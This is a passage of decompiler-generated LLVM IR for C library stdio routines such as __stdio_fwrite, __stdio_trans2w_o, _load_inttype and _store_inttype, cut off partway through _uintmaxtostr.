  uselistorder label %dec_label_pc_15df0, { 1, 0 }
  uselistorder label %dec_label_pc_15de0, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15d6c, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_15e00 = load i32, i32* @r4, align 4
  store i32 %v3_15e00, i32* %stack_var_-20, align 4
  %v6_15e00 = load i32, i32* @r5, align 4
  %v9_15e00 = load i32, i32* @r6, align 4
  %v12_15e00 = load i32, i32* @r7, align 4
  %v3_15e04 = load i16, i16* %arg3, align 2
  %v4_15e04 = zext i16 %v3_15e04 to i32
  %v1_15e08 = and i32 %v4_15e04, 512
  store i32 %v1_15e08, i32* @r4, align 4
  %v2_15e08 = icmp eq i32 %v1_15e08, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_15e08, label %dec_label_pc_15e20, label %dec_label_pc_15f1c

dec_label_pc_15e20:                               ; preds = %entry
  %v2_15e20 = add i32 %tmp, 4
  %v3_15e20 = inttoptr i32 %v2_15e20 to i32*
  %v4_15e20 = load i32, i32* %v3_15e20, align 4
  %v2_15e28 = add i32 %tmp, 16
  %v3_15e28 = inttoptr i32 %v2_15e28 to i32*
  %v4_15e28 = load i32, i32* %v3_15e28, align 4
  store i32 %v4_15e28, i32* @r0, align 4
  %v2_15e2c = add i32 %tmp, 12
  %v3_15e2c = inttoptr i32 %v2_15e2c to i32*
  %v4_15e2c = load i32, i32* %v3_15e2c, align 4
  store i32 %v4_15e2c, i32* @r3, align 4
  %v4_15e30 = icmp eq i32 %v4_15e20, -2
  %v2_15e34 = sub i32 %v4_15e2c, %v4_15e28
  br i1 %v4_15e30, label %dec_label_pc_15e34, label %dec_label_pc_15e5c

dec_label_pc_15e34:                               ; preds = %dec_label_pc_15e20
  %v3_15e38 = icmp ugt i32 %v2_15e34, %arg2
  br i1 %v3_15e38, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_15e34
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_15e34, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_15e34, %dec_label_pc_15e34 ]
  %v0_15e40 = phi i32 [ %arg2, %bb ], [ %v2_15e34, %dec_label_pc_15e34 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_15e40, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15e48 = call i32 @memcpy()
  %v0_15e4c = load i32, i32* @r5, align 4
  %v1_15e4c = add i32 %v0_15e4c, 16
  %v2_15e4c = inttoptr i32 %v1_15e4c to i32*
  %v3_15e4c = load i32, i32* %v2_15e4c, align 4
  %v1_15e50 = load i32, i32* @r4, align 4
  %v2_15e50 = add i32 %v1_15e50, %v3_15e4c
  store i32 %v2_15e50, i32* %v2_15e4c, align 4
  br label %dec_label_pc_15f30

dec_label_pc_15e5c:                               ; preds = %dec_label_pc_15e20
  store i32 %v2_15e34, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_15e34, %arg2
  br i1 %tmp18, label %dec_label_pc_15efc, label %dec_label_pc_15e68

dec_label_pc_15e68:                               ; preds = %dec_label_pc_15e5c
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_15e70 = call i32 @memcpy()
  %v0_15e74 = load i32, i32* @r5, align 4
  %v1_15e74 = add i32 %v0_15e74, 16
  %v2_15e74 = inttoptr i32 %v1_15e74 to i32*
  %v3_15e74 = load i32, i32* %v2_15e74, align 4
  %v1_15e78 = inttoptr i32 %v0_15e74 to i16*
  %v2_15e78 = load i16, i16* %v1_15e78, align 2
  %v1_15e7c = load i32, i32* @r6, align 4
  %v2_15e7c = add i32 %v1_15e7c, %v3_15e74
  %v1_15e80 = and i16 %v2_15e78, 256
  %v2_15e80 = icmp eq i16 %v1_15e80, 0
  store i32 %v2_15e7c, i32* %v2_15e74, align 4
  br i1 %v2_15e80, label %dec_label_pc_15f30, label %dec_label_pc_15e8c

dec_label_pc_15e8c:                               ; preds = %dec_label_pc_15e68
  %v0_15e8c = load i32, i32* @r7, align 4
  %v0_15e94 = load i32, i32* @r6, align 4
  %v4_15e98 = call i32 @memrchr(i32 %v0_15e8c, i32 10, i32 %v0_15e94, i32 %v2_15e7c)
  %v2_15e9c = icmp eq i32 %v4_15e98, 0
  br i1 %v2_15e9c, label %dec_label_pc_15f30, label %dec_label_pc_15ea4

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e8c
  %v0_15ea4 = load i32, i32* @r5, align 4
  store i32 %v0_15ea4, i32* @r0, align 4
  %v0_15ea8 = call i32 @__stdio_wcommit()
  %v2_15eac = icmp eq i32 %v0_15ea8, 0
  br i1 %v2_15eac, label %dec_label_pc_15f30, label %dec_label_pc_15eb4

dec_label_pc_15eb4:                               ; preds = %dec_label_pc_15ea4
  %v1_15eb4 = load i32, i32* @r6, align 4
  %v3_15eb4 = icmp uge i32 %v0_15ea8, %v1_15eb4
  %v1_15eb4.v0_15ea8 = select i1 %v3_15eb4, i32 %v1_15eb4, i32 %v0_15ea8
  store i32 %v1_15eb4.v0_15ea8, i32* @r4, align 4
  %v2_15ec0 = sub i32 %v1_15eb4, %v1_15eb4.v0_15ea8
  %v0_15ec4 = load i32, i32* @r7, align 4
  %v2_15ec4 = add i32 %v0_15ec4, %v2_15ec0
  store i32 %v2_15ec4, i32* %r7.global-to-local, align 4
  store i32 %v2_15ec4, i32* @r0, align 4
  store i32 %v1_15eb4.v0_15ea8, i32* @r2, align 4
  %v4_15ed4 = call i32 @__GI_memchr(i32 %v2_15ec4, i32 10, i32 %v1_15eb4.v0_15ea8, i32 %v2_15ec0)
  %v2_15ed8 = icmp eq i32 %v4_15ed4, 0
  br i1 %v2_15ed8, label %dec_label_pc_15f30, label %dec_label_pc_15ee0

dec_label_pc_15ee0:                               ; preds = %dec_label_pc_15eb4
  %v0_15ee0 = load i32, i32* @r5, align 4
  %v1_15ee0 = add i32 %v0_15ee0, 16
  %v2_15ee0 = inttoptr i32 %v1_15ee0 to i32*
  %v3_15ee0 = load i32, i32* %v2_15ee0, align 4
  %v0_15ee4 = load i32, i32* %r7.global-to-local, align 4
  %v1_15ee4 = load i32, i32* @r4, align 4
  %v2_15ee4 = sub i32 %v0_15ee4, %v4_15ed4
  %v2_15ee8 = add i32 %v2_15ee4, %v1_15ee4
  %v2_15eec = sub i32 %v3_15ee0, %v2_15ee8
  %v1_15ef0 = load i32, i32* @r6, align 4
  %v2_15ef0 = sub i32 %v1_15ef0, %v2_15ee8
  store i32 %v2_15ef0, i32* @r6, align 4
  store i32 %v2_15eec, i32* %v2_15ee0, align 4
  br label %dec_label_pc_15f30

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15e5c
  %v2_15efc = add i32 %tmp, 8
  %v3_15efc = inttoptr i32 %v2_15efc to i32*
  %v4_15efc = load i32, i32* %v3_15efc, align 4
  %v9_15f00 = icmp eq i32 %v4_15e28, %v4_15efc
  br i1 %v9_15f00, label %dec_label_pc_15f1c, label %dec_label_pc_15f08

dec_label_pc_15f08:                               ; preds = %dec_label_pc_15efc
  store i32 %tmp, i32* @r0, align 4
  %v0_15f0c = call i32 @__stdio_wcommit()
  %v2_15f10 = icmp eq i32 %v0_15f0c, 0
  br i1 %v2_15f10, label %dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge, label %bb15

dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge:  ; preds = %dec_label_pc_15f08
  %v0_15f1c.pre = load i32, i32* @r6, align 4
  %v0_15f20.pre = load i32, i32* @r5, align 4
  %v0_15f24.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15f1c

bb15:                                             ; preds = %dec_label_pc_15f08
  %v1_15f14 = load i32, i32* @r4, align 4
  store i32 %v1_15f14, i32* @r6, align 4
  br label %dec_label_pc_15f30

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge, %entry, %dec_label_pc_15efc
  %v0_15f24 = phi i32 [ %v0_15f24.pre, %dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_15efc ]
  %v0_15f20 = phi i32 [ %v0_15f20.pre, %dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_15efc ]
  %v0_15f1c = phi i32 [ %v0_15f1c.pre, %dec_label_pc_15f08.dec_label_pc_15f1c_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_15efc ]
  %v1_15f20 = inttoptr i32 %v0_15f20 to i16*
  %v5_15f28 = call i32 @__stdio_WRITE(i16* %v1_15f20, i32 %v0_15f24, i32 %v0_15f1c)
  store i32 %v5_15f28, i32* @r6, align 4
  br label %dec_label_pc_15f30

dec_label_pc_15f30:                               ; preds = %bb15, %dec_label_pc_15eb4, %dec_label_pc_15ea4, %dec_label_pc_15e8c, %dec_label_pc_15e68, %dec_label_pc_15ee0, %bb12, %dec_label_pc_15f1c
  %v0_15f30 = load i32, i32* @r6, align 4
  %v2_15f38 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15f38, i32* @r4, align 4
  store i32 %v6_15e00, i32* @r5, align 4
  store i32 %v9_15e00, i32* @r6, align 4
  store i32 %v12_15e00, i32* @r7, align 4
  ret i32 %v0_15f30

; uselistorder directives
  uselistorder i32 %v2_15ee8, { 1, 0 }
  uselistorder i32 %v2_15ec0, { 1, 0 }
  uselistorder i32 %v1_15eb4.v0_15ea8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15eb4, { 1, 0, 2 }
  uselistorder i32 %v2_15e34, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_15f30, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_15f1c, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15f40 = load i32, i32* @r4, align 4
  store i32 %v3_15f40, i32* %stack_var_-8, align 4
  %v3_15f44 = load i16, i16* %arg1, align 2
  %v4_15f44 = zext i16 %v3_15f44 to i32
  %v2_15f48 = and i32 %v4_15f44, %arg2
  %v4_15f48 = icmp eq i32 %v2_15f48, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_15f48, label %dec_label_pc_15f54, label %dec_label_pc_15f64

dec_label_pc_15f54:                               ; preds = %entry
  %v1_15f54 = and i32 %v4_15f44, 2176
  %v2_15f54 = icmp eq i32 %v1_15f54, 0
  br i1 %v2_15f54, label %dec_label_pc_15f5c, label %dec_label_pc_15f70

dec_label_pc_15f5c:                               ; preds = %dec_label_pc_15f54
  %v2_15f5c = or i32 %v4_15f44, %arg2
  %v1_15f60 = trunc i32 %v2_15f5c to i16
  store i16 %v1_15f60, i16* %arg1, align 2
  %v0_15f64.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15f64

dec_label_pc_15f64:                               ; preds = %entry, %dec_label_pc_15f5c
  %v0_15fa0 = phi i32 [ %tmp, %entry ], [ %v0_15f64.pre, %dec_label_pc_15f5c ]
  %v1_15f64 = inttoptr i32 %v0_15fa0 to i16*
  %v2_15f64 = load i16, i16* %v1_15f64, align 2
  %v3_15f64 = zext i16 %v2_15f64 to i32
  store i32 %v3_15f64, i32* @ip, align 4
  %v1_15f68 = and i32 %v3_15f64, 32
  %v2_15f68 = icmp eq i32 %v1_15f68, 0
  br i1 %v2_15f68, label %dec_label_pc_15f90, label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f54, %dec_label_pc_15f64
  %v0_15f70 = call i32 @__GI___errno_location()
  store i32 %v0_15f70, i32* %r0.global-to-local, align 4
  %v2_15f78 = inttoptr i32 %v0_15f70 to i32*
  store i32 9, i32* %v2_15f78, align 4
  br label %dec_label_pc_15f7c

dec_label_pc_15f7c:                               ; preds = %dec_label_pc_15fb8, %dec_label_pc_15f70
  %v0_15f7c = load i32, i32* @r4, align 4
  %v1_15f7c = inttoptr i32 %v0_15f7c to i16*
  %v2_15f7c = load i16, i16* %v1_15f7c, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15f84 = or i16 %v2_15f7c, 8
  store i16 %v1_15f84, i16* %v1_15f7c, align 2
  br label %bb11

dec_label_pc_15f90:                               ; preds = %dec_label_pc_15f64
  %tmp14 = urem i16 %v2_15f64, 4
  %v2_15f90 = icmp eq i16 %tmp14, 0
  br i1 %v2_15f90, label %dec_label_pc_15fec, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f90
  %v1_15f98 = and i32 %v3_15f64, 4
  store i32 %v1_15f98, i32* @r1, align 4
  %v2_15f98 = icmp eq i32 %v1_15f98, 0
  br i1 %v2_15f98, label %dec_label_pc_15fa0, label %dec_label_pc_15fd0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f98
  %v1_15fa0 = add i32 %v0_15fa0, 20
  %v2_15fa0 = inttoptr i32 %v1_15fa0 to i32*
  %v3_15fa0 = load i32, i32* %v2_15fa0, align 4
  store i32 %v3_15fa0, i32* %r2.global-to-local, align 4
  %v1_15fa4 = add i32 %v0_15fa0, 16
  %v2_15fa4 = inttoptr i32 %v1_15fa4 to i32*
  %v3_15fa4 = load i32, i32* %v2_15fa4, align 4
  %v9_15fa8 = icmp eq i32 %v3_15fa0, %v3_15fa4
  br i1 %v9_15fa8, label %dec_label_pc_15fb0, label %dec_label_pc_15fb8

dec_label_pc_15fb0:                               ; preds = %dec_label_pc_15fa0
  %v1_15fb0 = and i32 %v3_15f64, 2
  %v2_15fb0 = icmp eq i32 %v1_15fb0, 0
  br i1 %v2_15fb0, label %dec_label_pc_15fd0, label %dec_label_pc_15fb8

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fa0, %dec_label_pc_15fb0
  %v1_15fb8 = and i32 %v3_15f64, 1024
  %tmp12 = udiv i32 %v1_15fb8, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_15fc4 = call i32 @__GI_fseek()
  store i32 %v0_15fc4, i32* %r0.global-to-local, align 4
  %v2_15fc8 = icmp eq i32 %v0_15fc4, 0
  br i1 %v2_15fc8, label %.dec_label_pc_15fd0_crit_edge, label %dec_label_pc_15f7c

.dec_label_pc_15fd0_crit_edge:                    ; preds = %dec_label_pc_15fb8
  %v0_15fd0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %.dec_label_pc_15fd0_crit_edge, %dec_label_pc_15f98, %dec_label_pc_15fb0
  %v2_15fdc = phi i32 [ %v0_15fd0.pre, %.dec_label_pc_15fd0_crit_edge ], [ %v0_15fa0, %dec_label_pc_15f98 ], [ %v0_15fa0, %dec_label_pc_15fb0 ]
  %v1_15fd0 = inttoptr i32 %v2_15fdc to i16*
  %v2_15fd0 = load i16, i16* %v1_15fd0, align 2
  %v1_15fd4 = add i32 %v2_15fdc, 8
  %v2_15fd4 = inttoptr i32 %v1_15fd4 to i32*
  %v3_15fd4 = load i32, i32* %v2_15fd4, align 4
  store i32 %v3_15fd4, i32* %r2.global-to-local, align 4
  %v1_15fd8 = and i16 %v2_15fd0, -4
  store i16 %v1_15fd8, i16* %v1_15fd0, align 2
  %v0_15fe0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe0 = load i32, i32* @r4, align 4
  %v2_15fe0 = add i32 %v1_15fe0, 20
  %v3_15fe0 = inttoptr i32 %v2_15fe0 to i32*
  store i32 %v0_15fe0, i32* %v3_15fe0, align 4
  %v0_15fe4 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe4 = load i32, i32* @r4, align 4
  %v2_15fe4 = add i32 %v1_15fe4, 24
  %v3_15fe4 = inttoptr i32 %v2_15fe4 to i32*
  store i32 %v0_15fe4, i32* %v3_15fe4, align 4
  %v0_15fe8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15fe8 = load i32, i32* @r4, align 4
  %v2_15fe8 = add i32 %v1_15fe8, 16
  %v3_15fe8 = inttoptr i32 %v2_15fe8 to i32*
  store i32 %v0_15fe8, i32* %v3_15fe8, align 4
  %v0_15fec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15fec

dec_label_pc_15fec:                               ; preds = %dec_label_pc_15f90, %dec_label_pc_15fd0
  %v2_15ff8 = phi i32 [ %v0_15fa0, %dec_label_pc_15f90 ], [ %v0_15fec.pre, %dec_label_pc_15fd0 ]
  %v1_15fec = inttoptr i32 %v2_15ff8 to i16*
  %v2_15fec = load i16, i16* %v1_15fec, align 2
  %v3_15fec = zext i16 %v2_15fec to i32
  %v1_15ff0 = or i16 %v2_15fec, 64
  %v1_15ff4 = and i32 %v3_15fec, 2816
  store i32 %v1_15ff4, i32* %r0.global-to-local, align 4
  %v2_15ff4 = icmp eq i32 %v1_15ff4, 0
  store i16 %v1_15ff0, i16* %v1_15fec, align 2
  br i1 %v2_15ff4, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_15fec
  %v1_15ffc = load i32, i32* @r4, align 4
  %v2_15ffc = add i32 %v1_15ffc, 12
  %v3_15ffc = inttoptr i32 %v2_15ffc to i32*
  %v4_15ffc = load i32, i32* %v3_15ffc, align 4
  %v3_16000 = add i32 %v1_15ffc, 28
  %v4_16000 = inttoptr i32 %v3_16000 to i32*
  store i32 %v4_15ffc, i32* %v4_16000, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_15fec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_15f7c, %.thread1
  %v2_16008 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16008, i32* @r4, align 4
  %v1_1600c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1600c

; uselistorder directives
  uselistorder i32 %v2_15fdc, { 1, 0 }
  uselistorder i32 %v0_15fa0, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_15f44, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15fec, { 1, 0 }
  uselistorder label %dec_label_pc_15fd0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_15fb8, { 1, 0 }
  uselistorder label %dec_label_pc_15f70, { 1, 0 }
  uselistorder label %dec_label_pc_15f64, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_16010 = load i32, i32* @r2, align 4
  %v1_16010 = icmp slt i32 %v0_16010, 0
  %v0_16014 = load i32, i32* @r0, align 4
  %v1_16018 = and i32 %v0_16014, 2048
  %v2_1604c = icmp eq i32 %v1_16018, 0
  br i1 %v1_16010, label %dec_label_pc_1604c, label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %entry
  br i1 %v2_1604c, label %dec_label_pc_16028, label %dec_label_pc_16054

dec_label_pc_16028:                               ; preds = %dec_label_pc_16020
  %v7_16028 = icmp eq i32 %v0_16014, 256
  %v0_1602c = load i32, i32* @r1, align 4
  %v1_1602c = inttoptr i32 %v0_1602c to i32*
  %v2_1602c = load i32, i32* %v1_1602c, align 4
  %v2_16030 = urem i32 %v2_1602c, 256
  %v2_16030.v2_1602c = select i1 %v7_16028, i32 %v2_16030, i32 %v2_1602c
  br i1 %v7_16028, label %.thread, label %dec_label_pc_16038

dec_label_pc_16038:                               ; preds = %dec_label_pc_16028
  %v7_16038 = icmp eq i32 %v0_16014, 512
  br i1 %v7_16038, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16038
  %v4_16040 = urem i32 %v2_16030.v2_1602c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16038, %dec_label_pc_16028, %bb
  %v1_16048 = phi i32 [ %v2_1602c, %dec_label_pc_16038 ], [ %v2_16030, %dec_label_pc_16028 ], [ %v4_16040, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_16048

dec_label_pc_1604c:                               ; preds = %entry
  br i1 %v2_1604c, label %dec_label_pc_1605c, label %dec_label_pc_16054

dec_label_pc_16054:                               ; preds = %dec_label_pc_16020, %dec_label_pc_1604c
  %v0_16054 = load i32, i32* @r1, align 4
  %v1_16054 = inttoptr i32 %v0_16054 to i32*
  %v2_16054 = load i32, i32* %v1_16054, align 4
  %v3_16054 = add i32 %v0_16054, 4
  %v4_16054 = inttoptr i32 %v3_16054 to i32*
  %v5_16054 = load i32, i32* %v4_16054, align 4
  store i32 %v5_16054, i32* @r1, align 4
  ret i32 %v2_16054

dec_label_pc_1605c:                               ; preds = %dec_label_pc_1604c
  %v7_1605c = icmp eq i32 %v0_16014, 256
  %v0_16060 = load i32, i32* @r1, align 4
  %v1_16060 = inttoptr i32 %v0_16060 to i32*
  %v2_16060 = load i32, i32* %v1_16060, align 4
  %v2_16064 = urem i32 %v2_16060, 256
  %v2_16064.v2_16060 = select i1 %v7_1605c, i32 %v2_16064, i32 %v2_16060
  br i1 %v7_1605c, label %.thread2, label %dec_label_pc_1606c

dec_label_pc_1606c:                               ; preds = %dec_label_pc_1605c
  %v7_1606c = icmp eq i32 %v0_16014, 512
  br i1 %v7_1606c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1606c
  %v4_16070 = mul i32 %v2_16064.v2_16060, 65536
  %v4_16074 = sdiv i32 %v4_16070, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1606c, %dec_label_pc_1605c, %bb5
  %v0_16078 = phi i32 [ %v2_16060, %dec_label_pc_1606c ], [ %v2_16064, %dec_label_pc_1605c ], [ %v4_16074, %bb5 ]
  %v3_16078 = ashr i32 %v0_16078, 31
  store i32 %v3_16078, i32* @r1, align 4
  ret i32 %v0_16078

; uselistorder directives
  uselistorder i32 %v0_16078, { 1, 0 }
  uselistorder i32 %v2_16064, { 1, 0 }
  uselistorder i32 %v2_16060, { 1, 2, 0 }
  uselistorder i32 %v2_16030, { 1, 0 }
  uselistorder i32 %v2_1602c, { 1, 2, 0 }
  uselistorder i1 %v2_1604c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16054, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_16080 = icmp eq i32 %arg2, 256
  store i1 %v7_16080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16080, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_16084 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_16084, i8* %tmp3, align 1
  %v1_16088.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_16088 = phi i1 [ false, %entry ], [ %v1_16088.pre, %bb ]
  %v0_16088 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_16088, i32 %v0_16088)
  %v7_1608c = icmp eq i32 %arg2, 2048
  store i1 %v7_1608c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1608c, label %dec_label_pc_16094, label %dec_label_pc_1609c

dec_label_pc_16094:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_16094 = add i32 %tmp2, 4
  %v6_16094 = inttoptr i32 %v5_16094 to i32*
  store i32 %arg4, i32* %v6_16094, align 4
  ret i32 %tmp2

dec_label_pc_1609c:                               ; preds = %bb4
  %v7_1609c = icmp eq i32 %arg2, 512
  store i1 %v7_1609c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1609c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1609c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1609c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_160b8 = icmp slt i32 %tmp21, 0
  %v2_160b8 = icmp eq i32 %tmp21, 0
  store i1 %v2_160b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_160c0 = load i32, i32* @r2, align 4
  store i32 %v0_160c0, i32* %r5.global-to-local, align 4
  %v0_160c4 = load i32, i32* @r3, align 4
  store i32 %v0_160c4, i32* %r6.global-to-local, align 4
  br i1 %v1_160b8, label %dec_label_pc_160cc, label %dec_label_pc_160ec

dec_label_pc_160cc:                               ; preds = %entry
  %v1_160cc = icmp slt i32 %v0_160c4, 0
  %v2_160cc = icmp eq i32 %v0_160c4, 0
  store i1 %v2_160cc, i1* %cpsr_z.global-to-local, align 1
  %v1_160d0 = sub i32 0, %tmp21
  store i32 %v1_160d0, i32* %r7.global-to-local, align 4
  br i1 %v1_160cc, label %dec_label_pc_160d8, label %dec_label_pc_160ec

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160cc
  %v1_160dc = sub i32 0, %v0_160c0
  store i32 %v1_160dc, i32* %r5.global-to-local, align 4
  %v2_160dc = icmp eq i32 %v0_160c0, 0
  %v2_160e0 = icmp eq i1 %v2_160dc, false
  %v5_160e0 = sext i1 %v2_160e0 to i32
  %v6_160e0 = sub i32 %v5_160e0, %v0_160c4
  store i32 %v6_160e0, i32* %r6.global-to-local, align 4
  %v19_160e0 = icmp eq i32 %v6_160e0, 0
  store i1 %v19_160e0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_160f4

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160cc, %entry
  br label %dec_label_pc_160f4

dec_label_pc_160f4:                               ; preds = %dec_label_pc_160d8, %dec_label_pc_160ec
  %storemerge = phi i8 [ 0, %dec_label_pc_160ec ], [ 1, %dec_label_pc_160d8 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_160fc = load i32, i32* %r7.global-to-local, align 4
  %v2_16104 = udiv i32 -1, %v0_160fc
  store i32 %v2_16104, i32* %fp.global-to-local, align 4
  %v3_16114 = urem i32 -1, %v0_160fc
  %v1_16118 = add i32 %v3_16114, 1
  store i32 %v1_16118, i32* %sb.global-to-local, align 4
  %v9_1611c = icmp eq i32 %v1_16118, %v0_160fc
  store i1 %v9_1611c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1611c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_160f4
  %v1_16120 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16120, i32* %sb.global-to-local, align 4
  %v2_16124 = add i32 %v2_16104, 1
  store i32 %v2_16124, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_160f4, %bb
  %v0_16128 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16128, i32* %sl.global-to-local, align 4
  %v0_1612c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1612c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16130

dec_label_pc_16130thread-pre-split:               ; preds = %bb25
  %v0_16130.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_16134.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_16138.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16130

dec_label_pc_16130:                               ; preds = %dec_label_pc_16130thread-pre-split, %.thread
  %v0_161b4 = phi i32 [ %v0_16138.pre, %dec_label_pc_16130thread-pre-split ], [ %v0_160fc, %.thread ]
  %v0_161ac = phi i32 [ %v0_16134.pre, %dec_label_pc_16130thread-pre-split ], [ %v0_1612c, %.thread ]
